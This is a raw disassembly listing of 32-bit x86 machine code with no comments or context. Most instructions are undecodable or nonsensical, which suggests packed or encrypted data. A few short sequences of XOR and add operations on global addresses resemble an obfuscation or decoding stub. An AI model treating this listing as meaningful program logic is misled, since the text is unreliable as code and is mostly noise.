  4084a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084a6:	sbb    edi,edi
  4084a8:	(bad)  
  4084aa:	mov    DWORD PTR [ebx-0x45ef515b],edi
  4084b0:	mov    eax,ds:0x911384a2
  4084b5:	and    DWORD PTR [ebp-0x23],edi
  4084b8:	and    al,0xc7
  4084ba:	fst    QWORD PTR [ebx]
  4084bc:	jmp    0x40851e
  4084be:	hlt    
  4084bf:	dec    ecx
  4084c0:	xor    ecx,ecx
  4084c2:	mov    ch,0x27
  4084c4:	mov    ebp,0x54b72495
  4084c9:	jno    0x4084b6
  4084cb:	fmul   st,st(3)
  4084cd:	mov    bl,0xcb
  4084cf:	push   esi
  4084d0:	add    al,0xff
  4084d2:	scas   al,BYTE PTR es:[edi]
  4084d3:	sbb    dl,ah
  4084d5:	das    
  4084d6:	inc    eax
  4084d7:	push   0xe9395a3d
  4084dc:	sub    eax,0x3363281c
  4084e1:	cmp    bl,dh
  4084e3:	or     eax,0xbddd1520
  4084e8:	aad    0x3
  4084ea:	mov    ch,0x12
  4084ec:	lods   eax,DWORD PTR ds:[esi]
  4084ed:	daa    
  4084ee:	jbe    0x408516
  4084f0:	cmp    BYTE PTR [esi],al
  4084f2:	pop    ds
  4084f3:	ror    eax,1
  4084f5:	push   edi
  4084f6:	push   eax
  4084f7:	push   es
  4084f8:	mov    ah,0xe8
  4084fa:	outs   dx,DWORD PTR ds:[esi]
  4084fb:	lahf   
  4084fc:	cmp    eax,0xe075c522
  408501:	dec    esi
  408502:	jecxz  0x4084d0
  408504:	xchg   esp,eax
  408505:	imul   edi,esp,0xf147dccb
  40850b:	jne    0x408567
  40850d:	test   al,0x36
  40850f:	pop    esi
  408510:	addr16 hlt 
  408512:	call   DWORD PTR [eax-0x12]
  408515:	mov    cl,0x3
  408517:	popa   
  408518:	shr    al,cl
  40851a:	or     dl,BYTE PTR [ecx-0xb]
  40851d:	fst    st(2)
  40851f:	push   esp
  408520:	inc    ebx
  408521:	and    dh,bh
  408523:	std    
  408524:	ja     0x4084eb
  408526:	fistp  QWORD PTR [ebx]
  408528:	jnp    0x40858c
  40852a:	inc    edx
  40852b:	into   
  40852c:	jno    0x40852e
  40852e:	leave  
  40852f:	(bad)  
  408531:	outs   dx,BYTE PTR ds:[esi]
  408532:	jae    0x40856a
  408534:	xchg   BYTE PTR [ebp+0x2],dh
  408537:	cmp    DWORD PTR [esi],esi
  408539:	mov    bh,0xc2
  40853b:	push   ebx
  40853c:	or     BYTE PTR [esp+ecx*8-0x7a],dl
  408540:	cdq    
  408541:	nop
  408542:	jle    0x4084db
  408544:	xor    DWORD PTR [esi-0x738d9c96],0xffffffca
  40854b:	add    BYTE PTR [ebp+0x5b1f6249],dl
  408551:	dec    esp
  408552:	ja     0x408518
  408554:	mov    es,ebx
  408556:	and    edi,DWORD PTR [eax+0x5f]
  408559:	mov    ds:0x66a6a535,al
  40855e:	jp     0x4084f0
  408560:	fisttp DWORD PTR [eax-0x185c493e]
  408566:	gs mov ecx,0xb6def26c
  40856c:	lods   al,BYTE PTR ds:[esi]
  40856d:	and    ecx,DWORD PTR [edx+0x34]
  408570:	scas   eax,DWORD PTR es:[edi]
  408571:	lods   al,BYTE PTR ds:[esi]
  408572:	cld    
  408573:	stos   BYTE PTR es:[edi],al
  408574:	push   edi
  408575:	jl     0x408560
  408577:	test   al,0xef
  408579:	shl    BYTE PTR ds:[edi+0x73],cl
  40857d:	nop
  40857e:	cmp    eax,0xe87ba599
  408583:	sub    al,0x35
  408585:	dec    ebx
  408586:	xor    eax,0xe2de5ed5
  40858b:	test   ah,bh
  40858d:	dec    esi
  40858e:	mov    al,ds:0x4f81fb75
  408593:	push   es
  408594:	push   ds
  408595:	(bad)  
  408597:	stos   DWORD PTR es:[edi],eax
  408598:	dec    edi
  408599:	jne    0x408537
  40859b:	push   ss
  40859c:	add    al,BYTE PTR [ebx-0x80]
  40859f:	pop    edx
  4085a0:	adc    ah,BYTE PTR cs:[eax+0x46]
  4085a4:	or     al,0xb2
  4085a6:	pop    ebp
  4085a7:	mov    esi,0x9209d87
  4085ac:	jnp    0x40858d
  4085ae:	pushf  
  4085af:	aaa    
  4085b0:	push   esi
  4085b1:	mov    bl,0xdf
  4085b3:	lock jmp 0xd9d1:0x8552d3da
  4085bb:	icebp  
  4085bc:	test   al,0x9a
  4085be:	jb     0x40858d
  4085c0:	lods   eax,DWORD PTR ds:[esi]
  4085c1:	adc    eax,edi
  4085c3:	not    BYTE PTR [ecx+eiz*4]
  4085c6:	mov    ebp,0xfc340035
  4085cb:	pusha  
  4085cc:	fisub  WORD PTR [edi]
  4085ce:	pop    ebx
  4085cf:	xchg   esi,eax
  4085d0:	sbb    edi,DWORD PTR [edx]
  4085d2:	sub    dx,bp
  4085d5:	addr16 test ebp,ebp
  4085d8:	idiv   DWORD PTR [esi+eax*1+0x66]
  4085dc:	add    eax,0x13a3013c
  4085e1:	dec    ecx
  4085e2:	lods   al,BYTE PTR ds:[esi]
  4085e3:	cli    
  4085e4:	xor    al,0xf7
  4085e6:	or     DWORD PTR [ebp-0x5006434f],eax
  4085ec:	ss cli 
  4085ee:	aad    0xc5
  4085f0:	add    dl,cl
  4085f2:	adc    BYTE PTR [ebx+0x2f385304],ch
  4085f8:	sub    ebx,ecx
  4085fa:	ror    DWORD PTR [esi-0x26da7a75],cl
  408600:	mov    WORD PTR [esi],es
  408602:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408603:	pop    ebp
  408604:	or     edx,0x10344857
  40860a:	mov    ch,0xe0
  40860c:	xchg   edi,eax
  40860d:	gs sbb eax,0xc3454873
  408613:	cmp    dh,bl
  408615:	xlat   BYTE PTR ds:[ebx]
  408616:	inc    ebx
  408617:	bound  edx,QWORD PTR [esi+0x1b372313]
  40861d:	xchg   esi,eax
  40861e:	aas    
  40861f:	mov    eax,0x7b79f017
  408624:	pop    ds
  408625:	fist   DWORD PTR [edx+0x309c18e]
  40862b:	xor    eax,0xf5bd4077
  408630:	aaa    
  408631:	fimul  DWORD PTR [edx]
  408633:	xchg   esi,eax
  408634:	inc    edi
  408635:	mov    WORD PTR [ebp+0x24],?
  408638:	pop    ss
  408639:	pop    ebp
  40863a:	scas   al,BYTE PTR es:[edi]
  40863b:	sbb    bl,ah
  40863d:	stos   BYTE PTR es:[edi],al
  40863e:	fisub  DWORD PTR [edx-0x63d70f3d]
  408644:	xchg   ebx,eax
  408645:	sbb    al,0xe
  408647:	dec    edx
  408648:	stos   BYTE PTR es:[edi],al
  408649:	ret    0x7bf6
  40864c:	in     al,0x3b
  40864e:	or     esp,DWORD PTR [ebx]
  408650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408651:	jno    0x408630
  408653:	mov    cl,0x34
  408655:	push   ebx
  408656:	jo     0x4086cf
  408658:	loop   0x40862a
  40865a:	jmp    0x55a14fe5
  40865f:	cmp    BYTE PTR [edx],ch
  408661:	loopne 0x4086a5
  408663:	rcr    DWORD PTR [ecx+0x3b],0xf7
  408667:	imul   ebx,DWORD PTR [edi+ebp*8+0x6],0x848f34ff
  40866f:	fadd   QWORD PTR [ebx-0x20]
  408672:	pop    edi
  408673:	shl    BYTE PTR [eax-0x65c594a8],cl
  408679:	in     eax,0x0
  40867b:	out    dx,eax
  40867c:	jne    0x40864d
  40867e:	pop    esp
  40867f:	das    
  408680:	std    
  408681:	jns    0x408637
  408683:	call   0x6bd4:0xc9fb431e
  40868a:	mov    bl,dh
  40868c:	dec    ebx
  40868d:	(bad)  
  40868e:	mov    ecx,0x95815240
  408693:	sub    ebx,eax
  408695:	stc    
  408696:	shl    edi,1
  408698:	push   0x78
  40869a:	mov    ebx,0x8e12feb8
  40869f:	adc    DWORD PTR ds:0x433763,0x4336fb
  4086a9:	mov    DWORD PTR [ebp-0xc],ebx
  4086ac:	sbb    DWORD PTR ds:0x4337ef,0x433827
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx-0x4c40d6b6],ecx
  4086ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086cb:	mov    dl,dh
  4086cd:	jle    0x40874d
  4086cf:	and    al,0x7c
  4086d1:	jle    0x408751
  4086d3:	xor    cl,dh
  4086d5:	arpl   WORD PTR [eax-0x7c1f6d9b],bx
  4086db:	stc    
  4086dc:	sahf   
  4086dd:	jbe    0x408701
  4086df:	inc    esi
  4086e0:	ror    BYTE PTR [ecx+0x5154ab54],cl
  4086e6:	and    dh,0xfb
  4086e9:	es jmp 0x40872c
  4086ec:	push   eax
  4086ed:	mov    eax,ds:0x8641eb7a
  4086f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086f3:	popa   
  4086f4:	and    ebp,0x7a
  4086f7:	mov    esi,DWORD PTR [esp+edx*4+0x25eaa537]
  4086fe:	mov    bl,BYTE PTR [ecx+eax*1+0x27a1c9a3]
  408705:	push   ecx
  408706:	jns    0x40871a
  408708:	and    ah,BYTE PTR [ebx-0x3a216197]
  40870e:	inc    ebp
  40870f:	sbb    DWORD PTR [esi-0x448e2f4b],esp
  408715:	sub    ebp,DWORD PTR [eax+esi*2+0x2394d558]
  40871c:	jns    0x40873b
  40871e:	dec    ecx
  40871f:	mov    ds:0x25104ec4,eax
  408724:	jno    0x40877b
  408726:	out    0xb8,al
  408728:	jecxz  0x40879c
  40872a:	sbb    edx,DWORD PTR [ecx-0x36]
  40872d:	loope  0x408767
  40872f:	fdivr  DWORD PTR [ebx+0x5a01f528]
  408735:	inc    esi
  408736:	push   es
  408737:	pop    esp
  408738:	xchg   DWORD PTR [eax+0x70],ebp
  40873b:	nop
  40873c:	es jecxz 0x408703
  40873f:	in     eax,0x8f
  408741:	mov    DWORD PTR [ebp-0x102c3b7d],ebp
  408747:	mov    ds:0xe450bc,eax
  40874c:	add    BYTE PTR ds:0x23fa399c,al
  408752:	cmp    DWORD PTR [esi],esp
  408754:	mov    ah,0x1e
  408756:	dec    edx
  408757:	push   0xffffffea
  408759:	mov    ch,dl
  40875b:	mov    ds:0x67b2f637,al
  408760:	xor    ah,BYTE PTR [edi-0xd]
  408763:	retf   
  408764:	daa    
  408765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408766:	cmp    edx,DWORD PTR [ecx+0x25e5a902]
  40876c:	fsubr  QWORD PTR [eiz*2+0x669560ee]
  408773:	mov    edx,0xf5cffa4a
  408778:	stc    
  408779:	mov    edi,0xe4b60bf4
  40877e:	(bad)  
  40877f:	pop    ecx
  408780:	aam    0x43
  408782:	cmp    BYTE PTR [ebp+0x68],al
  408785:	(bad)  
  408786:	sbb    al,0x6d
  408788:	dec    esp
  408789:	inc    ebp
  40878a:	pusha  
  40878b:	mov    esi,eax
  40878d:	sub    eax,0xa2fe294e
  408792:	fist   DWORD PTR [ebp+0x2e]
  408795:	loope  0x4087ee
  408797:	cdq    
  408798:	inc    esp
  408799:	mov    bl,0xcc
  40879b:	sub    al,0x61
  40879d:	sbb    al,0x74
  40879f:	sti    
  4087a0:	adc    eax,0x1ecb73df
  4087a5:	in     al,0xab
  4087a7:	loop   0x40873f
  4087a9:	ficomp DWORD PTR [ebp+0x77848a89]
  4087af:	jns    0x40874a
  4087b1:	and    eax,0x7e2b1599
  4087b6:	imul   edx,DWORD PTR [edi-0x3ba63f63],0xa5da5a7e
  4087c0:	xor    DWORD PTR [ecx+0x8],esi
  4087c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087c4:	mov    BYTE PTR [ebp+eax*2+0x74],bl
  4087c8:	ret    0xc4fc
  4087cb:	pop    esi
  4087cc:	xor    al,0x8c
  4087ce:	into   
  4087cf:	xor    al,0x20
  4087d1:	jge    0x408753
  4087d3:	mov    ah,0x8e
  4087d5:	and    edx,DWORD PTR [ebx]
  4087d7:	xchg   ebp,eax
  4087d8:	ret    
  4087d9:	in     eax,dx
  4087da:	mov    es,WORD PTR [esi+esi*8+0x7ab61ed5]
  4087e1:	dec    ebp
  4087e2:	xchg   ah,bh
  4087e4:	mov    cl,BYTE PTR [ebp+0x12ee7a8e]
  4087ea:	sub    BYTE PTR ds:0xd519af0f,bl
  4087f0:	adc    bh,dl
  4087f2:	rcr    DWORD PTR ds:0xa3f717c5,0x8f
  4087f9:	test   eax,0x6ab9bac7
  4087fe:	call   0x9796:0xeb1c2bc
  408805:	sub    eax,DWORD PTR [eax]
  408807:	retf   0x587e
  40880a:	imul   edx,DWORD PTR [ebp+0x465f0edf],0xffffff83
  408811:	xchg   ebp,eax
  408812:	mov    edx,0xa424e888
  408817:	xor    dl,BYTE PTR [esi+0x14]
  40881a:	xchg   esp,eax
  40881b:	mov    bh,0x98
  40881d:	outs   dx,BYTE PTR ds:[esi]
  40881e:	test   DWORD PTR [ebp+ebx*8+0x7cacc916],ebp
  408825:	add    al,BYTE PTR [edx+0x188a2af1]
  40882b:	inc    edi
  40882c:	adc    ebp,DWORD PTR [edx+0x5ef6fc49]
  408832:	and    DWORD PTR [ecx],ecx
  408834:	sbb    eax,0x9e32cdce
  408839:	ins    BYTE PTR es:[edi],dx
  40883a:	dec    edi
  40883c:	stos   BYTE PTR es:[edi],al
  40883d:	push   edi
  40883e:	pop    ds
  40883f:	imul   edi,DWORD PTR [edi],0xffffffa5
  408842:	push   edi
  408843:	lods   al,BYTE PTR ds:[esi]
  408844:	sbb    bl,0x15
  408847:	push   es
  408848:	je     0x4087e6
  40884a:	pop    ecx
  40884b:	shr    BYTE PTR [ecx+ebx*8],1
  40884e:	sub    ebp,DWORD PTR [ebx+0x52]
  408851:	xchg   ah,bl
  408853:	ds (bad) 
  408856:	mov    ch,0xf9
  408858:	dec    ecx
  408859:	leave  
  40885a:	jle    0x4087ee
  40885c:	jle    0x408841
  40885e:	adc    ebp,DWORD PTR [esp+edx*8+0x1b]
  408862:	lods   al,BYTE PTR ds:[esi]
  408863:	sub    esi,DWORD PTR [eax+0x6a]
  408866:	mov    es,WORD PTR [esi+0x2cae4858]
  40886c:	inc    eax
  40886d:	fadd   DWORD PTR [ebp-0x21a5727b]
  408873:	mov    WORD PTR [esi],ds
  408875:	es jle 0x408887
  408878:	adc    ah,BYTE PTR [ecx]
  40887a:	pop    ebx
  40887b:	sub    BYTE PTR [ebx],0xd2
  40887e:	test   cl,al
  408880:	add    al,0x7e
  408882:	mov    bl,0x90
  408884:	fwait
  408885:	sbb    ah,BYTE PTR [edi+0x3057ef14]
  40888b:	test   DWORD PTR [ecx-0x13],edi
  40888e:	xchg   esp,eax
  40888f:	aad    0xcf
  408891:	mov    al,ds:0xc119139b
  408896:	push   cs
  408897:	bnd jp 0x408881
  40889a:	mov    ds:0x3f743e8a,al
  40889f:	loop   0x4088b2
  4088a1:	lds    eax,FWORD PTR [eax+esi*8-0x69e84043]
  4088a8:	sub    al,0x83
  4088aa:	xchg   ebp,eax
  4088ab:	mov    ebp,0xab7415fe
  4088b0:	push   ds
  4088b1:	(bad)  
  4088b2:	mov    esi,0x267905cf
  4088b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088b8:	rcl    al,0x49
  4088bb:	out    dx,eax
  4088bc:	fwait
  4088bd:	cdq    
  4088be:	fs mov dl,0x66
  4088c1:	ins    DWORD PTR es:[edi],dx
  4088c2:	nop
  4088c3:	shr    BYTE PTR [edi+0x4],cl
  4088c6:	shl    BYTE PTR [edi-0x4c],0x11
  4088ca:	adc    bl,BYTE PTR [esp+ebx*1+0x7ca82427]
  4088d1:	stos   BYTE PTR es:[edi],al
  4088d2:	popf   
  4088d3:	loop   0x40885a
  4088d5:	mov    dh,0x72
  4088d7:	mov    gs,WORD PTR [ebp-0xd]
  4088da:	sub    edx,DWORD PTR [ebp-0x6efce1c8]
  4088e0:	dec    ebp
  4088e1:	ret    
  4088e2:	shl    ecx,1
  4088e4:	outs   dx,BYTE PTR ds:[esi]
  4088e5:	sub    al,0x4d
  4088e7:	mov    WORD PTR [ecx],cs
  4088e9:	cdq    
  4088ea:	mov    ebp,0x2f9a5aaf
  4088ef:	jae    0x40894f
  4088f1:	or     al,BYTE PTR [eax+0x28009257]
  4088f7:	shl    BYTE PTR [ebx-0x60c5fc05],cl
  4088fd:	mov    eax,DWORD PTR [eax]
  4088ff:	xor    DWORD PTR ds:0x433763,0x7c2a
  408909:	mov    cx,WORD PTR [ebp-0x4]
  40890d:	adc    DWORD PTR ds:0x4337db,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x433753,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43371f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x433827,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0xf5501d2c
  408968:	fwait
  408969:	mov    al,0xd4
  40896b:	jle    0x4089eb
  40896d:	and    al,0x7c
  40896f:	jle    0x4089ef
  408971:	ss jmp 0x408979
  408974:	test   eax,0x3a2a4b17
  408979:	pop    ebp
  40897a:	jl     0x4089a3
  40897c:	lods   al,BYTE PTR ds:[esi]
  40897d:	xchg   edi,eax
  40897e:	xlat   BYTE PTR ds:[ebx]
  40897f:	jb     0x4089da
  408981:	jbe    0x408999
  408983:	or     eax,DWORD PTR [ebx-0x51]
  408986:	inc    edi
  408987:	imul   ebx,DWORD PTR [ecx+0x21],0x77
  40898b:	in     eax,dx
  40898c:	clc    
  40898d:	ja     0x408985
  40898f:	pop    esp
  408990:	hlt    
  408991:	in     al,dx
  408992:	dec    eax
  408993:	retf   0x59b6
  408996:	in     al,dx
  408997:	fiadd  WORD PTR [edi+0x54612f24]
  40899d:	cmp    bl,BYTE PTR [edi-0x51]
  4089a0:	cmp    esp,ebp
  4089a2:	and    edi,DWORD PTR [ebp+0x2f]
  4089a5:	fldcw  WORD PTR [ebx-0x47978f64]
  4089ab:	mov    BYTE PTR [ebx-0x46],bl
  4089ae:	push   eax
  4089af:	and    BYTE PTR [ecx-0x19],ch
  4089b2:	push   edx
  4089b3:	ror    DWORD PTR [esp+ecx*8-0x20ed78d4],0xb8
  4089bb:	dec    edx
  4089bc:	pop    ecx
  4089bd:	and    BYTE PTR [ebp-0x3b],dl
  4089c0:	sub    BYTE PTR [eax+0x1c],dh
  4089c3:	add    ebx,DWORD PTR [ebx+0x77]
  4089c6:	mov    ecx,0x54af343d
  4089cb:	mov    ecx,0x6907f039
  4089d0:	cmp    al,0x77
  4089d2:	and    eax,0xb435bbed
  4089d7:	push   0x97b63668
  4089dc:	cdq    
  4089dd:	push   0xffffffe5
  4089df:	sahf   
  4089e0:	and    DWORD PTR [edx-0x6f],esi
  4089e3:	adc    esi,DWORD PTR [eax+0x365a8fb3]
  4089e9:	inc    ebp
  4089ea:	dec    ebx
  4089eb:	stc    
  4089ec:	in     al,dx
  4089ed:	repz add eax,0x25cf867c
  4089f3:	push   ebx
  4089f4:	inc    edi
  4089f5:	fnsetpm(287 only) 
  4089f7:	cmp    dl,BYTE PTR [eax-0x6fe7fe7c]
  4089fd:	jo     0x408a65
  4089ff:	push   esi
  408a00:	or     al,0x87
  408a02:	arpl   di,si
  408a04:	mov    cl,0x1e
  408a06:	jp     0x4089ab
  408a08:	sub    esi,DWORD PTR [eax+0x2ab1ac88]
  408a0e:	test   cl,ch
  408a10:	push   edi
  408a11:	repnz cmc 
  408a13:	les    esp,FWORD PTR [ecx+0x57]
  408a16:	rol    DWORD PTR [esi],1
  408a18:	jnp    0x4089a2
  408a1a:	aam    0x9c
  408a1c:	lods   eax,DWORD PTR ds:[esi]
  408a1d:	les    edx,FWORD PTR ds:0xeae8417e
  408a23:	xor    DWORD PTR [ecx-0x76],edx
  408a26:	xchg   esi,eax
  408a27:	jecxz  0x4089c5
  408a29:	jns    0x408a48
  408a2b:	stos   BYTE PTR es:[edi],al
  408a2c:	pusha  
  408a2d:	outs   dx,BYTE PTR ds:[esi]
  408a2e:	or     DWORD PTR ds:[esi],ecx
  408a31:	icebp  
  408a32:	dec    edx
  408a33:	sub    eax,ecx
  408a35:	test   BYTE PTR [eax+0x799237d8],dh
  408a3b:	mov    ah,BYTE PTR [esi]
  408a3d:	(bad)  
  408a3e:	aad    0xfa
  408a40:	cmp    BYTE PTR [ecx+0x59820b4],dh
  408a46:	mov    al,0x7a
  408a48:	push   edx
  408a49:	mov    eax,ds:0xa6f2ef38
  408a4e:	test   eax,0x6b303386
  408a53:	jbe    0x408ad0
  408a55:	push   esi
  408a56:	cmp    ecx,ecx
  408a58:	aad    0x4f
  408a5a:	clc    
  408a5b:	add    eax,0xd834cfc4
  408a60:	pop    edi
  408a61:	or     al,BYTE PTR [eax+0x4b96a9fa]
  408a67:	iret   
  408a68:	aam    0x9e
  408a6a:	xchg   BYTE PTR [edi-0x2d523950],dh
  408a70:	and    ebx,ebx
  408a72:	jmp    0x408ab1
  408a74:	jl     0x408aac
  408a76:	test   al,ah
  408a78:	mov    WORD PTR [esi+0x31],ds
  408a7b:	and    BYTE PTR [edx+0x5a],0x7a
  408a7f:	loope  0x408a0b
  408a81:	aad    0x92
  408a83:	lds    ebx,FWORD PTR [ebx]
  408a85:	inc    esp
  408a86:	daa    
  408a87:	cmp    al,0xd6
  408a89:	imul   eax,esp,0x93ce5e6c
  408a8f:	or     DWORD PTR [edi],0xc21c027c
  408a95:	cdq    
  408a96:	loope  0x408aef
  408a98:	jno    0x408a6c
  408a9a:	sbb    DWORD PTR fs:[ecx-0x4c],ebp
  408a9e:	fmulp  st(4),st
  408aa0:	je     0x408ae9
  408aa2:	pusha  
  408aa3:	(bad)  
  408aa4:	push   0xebd937a4
  408aa9:	mov    bl,0xf9
  408aab:	je     0x408a77
  408aad:	je     0x408a88
  408aaf:	loope  0x408a54
  408ab1:	neg    BYTE PTR [edi-0x39]
  408ab4:	ins    DWORD PTR es:[edi],dx
  408ab5:	or     ecx,DWORD PTR [ecx]
  408ab7:	stc    
  408ab8:	mov    ds:0xd7ac4905,al
  408abd:	out    dx,al
  408abe:	sbb    al,0x7f
  408ac0:	push   ecx
  408ac1:	daa    
  408ac2:	sbb    esi,DWORD PTR [esi+0x5d]
  408ac5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ac6:	jns    0x408b19
  408ac8:	test   DWORD PTR [edx-0x65dbf314],edi
  408ace:	retf   0x5180
  408ad1:	mov    eax,DWORD PTR [ebx-0x3437441a]
  408ad7:	leave  
  408ad8:	ror    DWORD PTR [edx],cl
  408ada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408adb:	push   eax
  408adc:	icebp  
  408add:	les    ebx,FWORD PTR [edi]
  408adf:	sub    DWORD PTR [ebx+0x7b],ebp
  408ae2:	mov    bh,0xb2
  408ae4:	sub    esp,edi
  408ae6:	add    edi,DWORD PTR ds:0xbba04755
  408aec:	(bad)  
  408aee:	or     ecx,DWORD PTR [esi]
  408af0:	test   al,0xb6
  408af2:	scas   al,BYTE PTR es:[edi]
  408af3:	pop    esp
  408af4:	ss es or ax,0x9b66
  408afa:	aaa    
  408afb:	shr    BYTE PTR ss:[eax],0xd9
  408aff:	and    eax,0xbb638d70
  408b04:	push   sp
  408b06:	aad    0x5d
  408b08:	cmp    BYTE PTR [edi+0x52],cl
  408b0b:	add    BYTE PTR [ecx-0x548e5172],dl
  408b11:	xor    eax,0x1e66e569
  408b16:	pop    esi
  408b17:	mov    esi,0xa7361ea1
  408b1c:	pusha  
  408b1d:	sbb    al,0xf0
  408b1f:	pop    ss
  408b20:	xor    DWORD PTR [ebp+0x67],0x55622e2b
  408b27:	add    DWORD PTR [esi],ebp
  408b29:	lock adc BYTE PTR [eax+eiz*4-0x3d],bh
  408b2e:	jle    0x408b9b
  408b30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b31:	mov    ah,0x97
  408b33:	inc    ebp
  408b34:	fsub   QWORD PTR [ebp-0x6c]
  408b37:	daa    
  408b38:	xchg   esp,eax
  408b39:	addr16 call 0xe423:0x82143d25
  408b41:	ins    BYTE PTR es:[edi],dx
  408b42:	add    bl,BYTE PTR [esi]
  408b44:	jmp    0x5419c9fe
  408b49:	push   eax
  408b4a:	mov    al,ds:0x7f6282fd
  408b4f:	sbb    edx,DWORD PTR [ebx+0x1]
  408b52:	or     eax,0x50dcac4c
  408b57:	add    BYTE PTR [ecx],cl
  408b59:	std    
  408b5a:	pusha  
  408b5b:	pop    ebp
  408b5c:	cwde   
  408b5d:	xor    edx,DWORD PTR [esi-0x4d]
  408b60:	gs mov esi,0x516e9635
  408b66:	cmp    DWORD PTR [edx-0x129da26d],ecx
  408b6c:	or     ebx,DWORD PTR [eax-0x6f91b98f]
  408b72:	(bad)  
  408b75:	ss push eax
  408b77:	imul   eax,eax,0x21b03bf
  408b7d:	xchg   esi,eax
  408b7e:	or     DWORD PTR [edx],0xfe6246ca
  408b84:	add    eax,0x3d79f8c6
  408b89:	mov    ecx,0xa76cc5c2
  408b8e:	xchg   DWORD PTR [esi+0x5f],esi
  408b91:	sbb    al,BYTE PTR [eax-0x6e0176ad]
  408b97:	outs   dx,BYTE PTR ds:[esi]
  408b98:	dec    eax
  408b99:	mov    WORD PTR [edi+ecx*1+0x1d85],cs
  408ba0:	add    BYTE PTR [ebx+0x4d8b0845],cl
  408ba6:	lock xor eax,esi
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	enter  0x5a9a,0x58
  408bf4:	data16 sar BYTE PTR [esi+0x7e],cl
  408bf8:	and    al,0x7c
  408bfa:	jle    0x408c7a
  408bfc:	lahf   
  408bfd:	jnp    0x408bd8
  408bff:	add    eax,0xf3f12222
  408c04:	or     DWORD PTR [edx-0x5f5d729b],esp
  408c0a:	adc    esi,ebx
  408c0c:	dec    ecx
  408c0d:	clc    
  408c0e:	stos   BYTE PTR es:[edi],al
  408c0f:	push   ss
  408c10:	sbb    ch,BYTE PTR [edi+0x44]
  408c13:	jnp    0x408c67
  408c15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c16:	mov    ebp,0xf98b2428
  408c1b:	addr16 dec edx
  408c1d:	(bad)  
  408c1e:	call   0x1196a799
  408c23:	mov    edx,0x1b121229
  408c28:	test   al,0x4e
  408c2a:	jmp    0x408c32
  408c2c:	add    al,0xb5
  408c2e:	add    al,0x5
  408c30:	jmp    0x408c29
  408c32:	pop    eax
  408c33:	mov    bh,0x47
  408c35:	scas   eax,DWORD PTR es:[edi]
  408c36:	jl     0x408bd2
  408c38:	pop    ds
  408c39:	iret   
  408c3a:	sti    
  408c3b:	pop    ss
  408c3c:	pop    ds
  408c3d:	rcr    BYTE PTR [esi],cl
  408c3f:	push   es
  408c40:	or     edx,DWORD PTR [eax+0x5a]
  408c43:	mov    ds:0x5125840,al
  408c48:	jnp    0x408c67
  408c4a:	mov    dl,dl
  408c4c:	jnp    0x408cb7
  408c4e:	std    
  408c4f:	mov    WORD PTR [edi+edx*4],es
  408c52:	retf   0x236f
  408c55:	or     BYTE PTR [edi],ah
  408c57:	arpl   bx,bx
  408c59:	cmp    DWORD PTR [edx+0x74],edi
  408c5c:	dec    esp
  408c5d:	scas   eax,DWORD PTR es:[edi]
  408c5e:	cmp    ah,BYTE PTR [ebx+0x5fa9795d]
  408c64:	or     ch,BYTE PTR [ebx]
  408c66:	loopne 0x408c9a
  408c68:	bnd jne 0x408c1a
  408c6b:	(bad)  
  408c6c:	sub    ebp,DWORD PTR [edi+ebp*8]
  408c6f:	(bad)  
  408c70:	popf   
  408c71:	fidivr DWORD PTR [edx+0x72]
  408c74:	pop    ebx
  408c75:	cmp    BYTE PTR [edx],0x81
  408c78:	add    DWORD PTR [esi+0x30e2626c],esp
  408c7e:	xor    bh,BYTE PTR [esi-0x3ddf955e]
  408c84:	int3   
  408c85:	xchg   edi,eax
  408c86:	mov    ecx,0x8cbf44c3
  408c8b:	mov    al,0xae
